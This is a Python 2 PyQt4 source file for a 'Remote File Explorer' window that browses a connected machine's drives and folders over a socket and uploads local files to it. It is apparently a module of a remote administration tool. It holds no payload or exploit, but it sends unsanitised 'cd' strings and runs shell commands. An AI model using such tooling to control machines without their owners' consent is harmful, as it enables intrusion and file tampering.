from PyQt4.QtGui import *
from PyQt4.QtCore import *
from mexploer_ui import Ui_Form
import ast
import subprocess
import ctypes
import time
import os
from libs.modechat import get, send

class mainPopup(QWidget, Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.icon = args['icon']
        self.path = args['path']

        self.gui = QApplication.processEvents

        # hide progressbar
        self.progressBar.setVisible(False)
        self.statusLabel.setVisible(False)
        self.cancelButton.setVisible(False)

        # progress status
        self.activeProgress = False

        # init icons
        self.fileIcon = os.path.join(self.path, 'assets', 'file.png')
        self.folderIcon = os.path.join(self.path, 'assets', 'folder.png')

        self.setWindowTitle('Remote File Explorer on - %s - Socket #%s' % (self.ipAddress, self.socket))
        self.setWindowIcon(QIcon(self.icon))

        self.Kernel32 = ctypes.windll.kernel32

        # signals
        self.rupButton.clicked.connect(self.rparentFolder)
        self.lupButton.clicked.connect(self.lparentFolder)
        self.lexplorerTable.doubleClicked.connect(self.lopenFolder)
        self.rexplorerTable.doubleClicked.connect(self.ropenFolder)
        self.lexplorerPathEntry.returnPressed.connect(self.lopenPath)
        self.rexplorerPathEntry.returnPressed.connect(self.ropenPath)
        self.uploadButton.clicked.connect(self.upload)
        self.cancelButton.clicked.connect(self.cancelProgress)

        # Initializing combobox change Event
        self.connect(self.rexplorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.rdriveChange)
        self.connect(self.lexplorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.ldriveChange)


        self.getRemoteContent()
        self.getLocalContent()

    def tempBlockSignals(self, bool):
        if bool:
            self.rexplorerDrivesDrop.blockSignals(True)
            self.rexplorerPathEntry.blockSignals(True)
            self.rexplorerTable.blockSignals(True)
            self.uploadButton.blockSignals(True)
            self.downloadButton.blockSignals(True)
            self.rupButton.blockSignals(True)
            self.rrefreshButton.blockSignals(True)
        elif not bool:
            self.rexplorerDrivesDrop.blockSignals(False)
            self.rexplorerPathEntry.blockSignals(False)
            self.rexplorerTable.blockSignals(False)
            self.uploadButton.blockSignals(False)
            self.downloadButton.blockSignals(False)
            self.rupButton.blockSignals(False)
            self.rrefreshButton.blockSignals(False)

    def cancelProgress(self):
        self.activeProgress = False

    def upload(self):
        # Get folder name
        type = str(self.lexplorerTable.item(self.lexplorerTable.currentItem().row(), 0).text())
        _file = str(self.lexplorerTable.item(self.lexplorerTable.currentItem().row(), 1).text())

        if 'File' in type:

            # Preparing for upload
            self.progressBar.setVisible(True)
            self.statusLabel.setVisible(True)
            self.cancelButton.setVisible(True)
            self.tempBlockSignals(True)

            self.activeProgress = True

            self.statusLabel.setText('Uploading: %s' % str(_file))

            end = '[ENDOFMESSAGE]'
            fileSize = os.path.getsize(_file)
            uploadedSize = 0

            send(self.sock, 'upload '+_file)

            with open(_file, 'rb') as _f:
                while 1:
                    self.gui()
                    if not self.activeProgress:
                        break
                    data = _f.readline()
                    uploadedSize += len(data)
                    if data:
                        self.sock.send(data)
                        self.progressBar.setValue(uploadedSize*100/fileSize)
                        del data
                    else:
                        self.sock.send(end)
                        break
            if self.activeProgress:
                result = self.sock.recv(1024)
                if 'downloadDone' in result:
                    self.getRemoteContent()
                elif 'downloadError' in result:
                    return False
            self.progressBar.setVisible(False)
            self.statusLabel.setVisible(False)
            self.cancelButton.setVisible(False)
            self.tempBlockSignals(False)

    def getLocalDrives(self):
        # Turn combo signal on
        self.comboInEditMode = True
        self.lexplorerDrivesDrop.clear()
        drives = self.Exec('wmic logicaldisk get caption')
        print drives
        for i in drives.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.lexplorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))
        # Turn combo signal off
        self.comboInEditMode = False
    # END: get drives

    def Exec(self, cmde):
        if cmde:
            try:
                execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                cmdoutput = execproc.stdout.read() + execproc.stderr.read()
                return cmdoutput
            except Exception as e:
                return str(e)

    def has_hidden_attribute(self, filepath):
        try:
            attrs = self.Kernel32.GetFileAttributesW(unicode(filepath))
            assert attrs != -1
            result = bool(attrs & 2)
        except (AttributeError, AssertionError):
            result = False
        return result

    # open parent folder
    def lparentFolder(self):
        os.chdir('..')
        self.getLocalContent()

    # open remote folder
    def lopenFolder(self):

        # Get folder name
        type = self.lexplorerTable.item(self.lexplorerTable.currentItem().row(), 0).text()
        name = self.lexplorerTable.item(self.lexplorerTable.currentItem().row(), 1).text()

        if 'Folder' in type:
            # Choose new folder
            try:
                os.chdir(str(name))
            except WindowsError:
                warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory\nAccess Denied', QMessageBox.Ok)
                warn.exec_()
                return
            try:
                # Update Table
                self.getLocalContent()
            except WindowsError:
                os.chdir('..')
                self.getLocalContent()
                warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory\nAccess Denied', QMessageBox.Ok)
                warn.exec_()

    def ldriveChange(self):
        if not self.comboInEditMode:
            drive = str(self.lexplorerDrivesDrop.itemText(self.lexplorerDrivesDrop.currentIndex()))
            print drive
            os.chdir(drive)
            self.getLocalContent()

    # open remote folder from path entry
    def lopenPath(self):
        try:
            os.chdir(str(self.lexplorerPathEntry.text()))
            self.getLocalContent()
        except WindowsError:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Path', QMessageBox.Ok)
            warn.exec_()

    def getLocalContent(self):

        def sizeof_fmt(num, suffix='B'):
            for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)

        # Turn combo signal on
        self.comboInEditMode = True
        self.lexplorerDrivesDrop.clear()
        self.data = self.Exec('wmic logicaldisk get caption')
        # Set captions in combobox
        for i in self.data.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.lexplorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Initializing table
        self.lexplorerTable.clearContents()
        self.lexplorerTable.sortItems(0)

        content = {}
        for n, i in enumerate(os.listdir(u'.')):
            content[n] = {}
            content[n]['name'] = i
            content[n]['type'] = os.path.isfile(i)
            content[n]['size'] = os.path.getsize(i)
            content[n]['modified'] = time.ctime(os.path.getmtime(i))
            content[n]['hidden'] = self.has_hidden_attribute(i)
        content['path'] = os.getcwdu()


        self.lexplorerPathEntry.setText(content['path'])

        # Get active drive caption
        self.lexplorerDrivesDrop.setCurrentIndex(self.lexplorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))


        # Turn combo signal off
        self.comboInEditMode = False

        # set tables row count
        self.lexplorerTable.setRowCount(len(content)-1)

        # add content to table
        for n, i in enumerate(content):
            if i == 'path':
                continue
            try:
                ext = content[i]['name'].split('.')[-1]
            except Exception, e:
                ext = ''

            if content[i]['hidden']:
                fileColor = QColor(235, 235, 235)
                folderColor = QColor(201, 101, 101)
            else:
                fileColor = QColor(155, 89, 182)
                folderColor = QColor(0, 255, 255)

            # set content type
            item = QTableWidgetItem('File') if content[i]['type'] else QTableWidgetItem('Folder')
            if content[i]['type']:
                item.setTextColor(fileColor)
                item.setIcon(QIcon(QPixmap(self.fileIcon)))
                item.setSizeHint(QSize(100, 30))
            else:
                item.setTextColor(folderColor)
                item.setIcon(QIcon(QPixmap(self.folderIcon)))
                item.setSizeHint(QSize(100, 30))
            self.lexplorerTable.setItem(n, 0, item)

            # set content name
            item = QTableWidgetItem(content[i]['name'])
            if content[i]['type']:
                item.setTextColor(fileColor)
            else:
                item.setTextColor(folderColor)
            self.lexplorerTable.setItem(n, 1, item)

            # set content modified date
            item = QTableWidgetItem(content[i]['modified'])
            item.setTextAlignment(Qt.AlignCenter)
            item.setSizeHint(QSize(220, 30))
            self.lexplorerTable.setItem(n, 2, item)

            # set file size
            item = QTableWidgetItem(sizeof_fmt(content[i]['size'])) if content[i]['type'] else QTableWidgetItem('')
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(fileColor)
            self.lexplorerTable.setItem(n, 3, item)

        # update table
        self.lexplorerTable.resizeColumnsToContents()
        self.lexplorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)

    def getRemoteContent(self):

        def sizeof_fmt(num, suffix='B'):
            for unit in ['','K','M','G','T','P','E','Z']:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)

        # Turn combo signal on
        self.comboInEditMode = True
        self.rexplorerDrivesDrop.clear()
        self.data = get(self.sock, 'wmic logicaldisk get caption', 'mexplorer')
        # Set captions in combobox
        for i in self.data.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.rexplorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Initializing table
        self.rexplorerTable.clearContents()
        self.rexplorerTable.sortItems(0)

        while 1:
            try:
                self.data = get(self.sock, 'ls', 'explorerContent')

                # set remote path entry
                content = ast.literal_eval(self.data)
            except (SyntaxError, ValueError):
                continue
            break


        self.rexplorerPathEntry.setText(content['path'])

        # Get active drive caption
        self.rexplorerDrivesDrop.setCurrentIndex(self.rexplorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))


        # Turn combo signal off
        self.comboInEditMode = False

        # set tables row count
        self.rexplorerTable.setRowCount(len(content)-1)

        # add content to table
        for n, i in enumerate(content):
            if i == 'path':
                continue
            try:
                ext = content[i]['name'].split('.')[-1]
            except Exception, e:
                ext = ''

            if content[i]['hidden']:
                fileColor = QColor(235, 235, 235)
                folderColor = QColor(201, 101, 101)
            else:
                fileColor = QColor(155, 89, 182)
                folderColor = QColor(0, 255, 255)

            # set content type
            item = QTableWidgetItem('File') if content[i]['type'] else QTableWidgetItem('Folder')
            if content[i]['type']:
                item.setTextColor(fileColor)
                item.setIcon(QIcon(QPixmap(self.fileIcon)))
                item.setSizeHint(QSize(100, 30))
            else:
                item.setTextColor(folderColor)
                item.setIcon(QIcon(QPixmap(self.folderIcon)))
                item.setSizeHint(QSize(100, 30))
            self.rexplorerTable.setItem(n, 0, item)

            # set content name
            item = QTableWidgetItem(content[i]['name'])
            if content[i]['type']:
                item.setTextColor(fileColor)
            else:
                item.setTextColor(folderColor)
            self.rexplorerTable.setItem(n, 1, item)

            # set content modified date
            item = QTableWidgetItem(content[i]['modified'])
            item.setTextAlignment(Qt.AlignCenter)
            item.setSizeHint(QSize(220, 30))
            self.rexplorerTable.setItem(n, 2, item)

            # set file size
            item = QTableWidgetItem(sizeof_fmt(content[i]['size'])) if content[i]['type'] else QTableWidgetItem('')
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(fileColor)
            self.rexplorerTable.setItem(n, 3, item)

        # update table
        self.rexplorerTable.resizeColumnsToContents()
        self.rexplorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)

    # open parent folder
    def rparentFolder(self):
        get(self.sock, 'cd ..', 'parentfolder')
        self.getRemoteContent()

    # Change Drive
    def rdriveChange(self):
        if not self.comboInEditMode:
            data = get(self.sock, 'cd ' + str(self.rexplorerDrivesDrop.itemText(self.rexplorerDrivesDrop.currentIndex())), 'drivechange')
            if 'Error opening directory' in data:
                warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
                warn.exec_()
            self.getRemoteContent()

    # open remote folder
    def ropenFolder(self):

        # Get folder name
        type = self.rexplorerTable.item(self.rexplorerTable.currentItem().row(), 0).text()
        name = self.rexplorerTable.item(self.rexplorerTable.currentItem().row(), 1).text()

        if 'Folder' in type:

            # Choose new folder
            get(self.sock, 'cd %s' % name, 'choosefolder')

            # Update table
            self.getRemoteContent()

    # open remote folder from path entry
    def ropenPath(self):
        recv = get(self.sock, 'cd %s' % str(self.rexplorerPathEntry.text()), 'changepath')
        if 'Error opening directory' in recv:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Path', QMessageBox.Ok)
            warn.exec_()

        self.getRemoteContent()